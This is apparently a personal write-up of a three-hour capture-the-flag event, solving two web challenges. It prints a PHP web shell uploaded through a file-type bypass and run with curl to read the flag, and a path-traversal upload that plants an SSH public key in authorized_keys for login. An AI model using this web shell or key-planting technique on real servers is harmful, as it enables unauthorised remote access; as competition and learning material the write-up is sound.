---
created: 2024-06-27T07:05
updated: 2024-07-01T20:09
tags:
  - box
---

# thehackerconclave

**#6** 1500 points.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1719878953/2024/07/31175b24ee1a86c7d293bab9d120ee88.png)

3 hour CTF with a bunch of typos and mis-management.

Joined [@WorldWideFlags](https://ctftime.org/team/283853) on this one.

## Bad Upload

### Payload

```php
<?php
echo 'Command:';
if($_POST){
system($_POST['cmd']);
}
__halt_compiler();
?>
```

Simply edit the HTML markup, and replace one of the option values with `php`.

```shell
curl --request POST \
  --url http://ctf.thehackerconclave.es:20003/documents/payload.php \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --data 'cmd=cat /flag/flag.txt'
```

## Backup server

### Generate Key

```sh
ssh-keygen
```

### Rename public key to `authorized_keys` and upload to `.ssh/`

```curl
curl --request POST \
  --url http://ctf.thehackerconclave.es:20007/index.php \
  --header 'Content-Type: multipart/form-data' \
  --form 'file=@authorized_keys' \
  --form directory=../.ssh
```

### Connect to it with private key

```shell
 ssh -i sshkey user1@ctf.thehackerconclave.es -p 20008
```
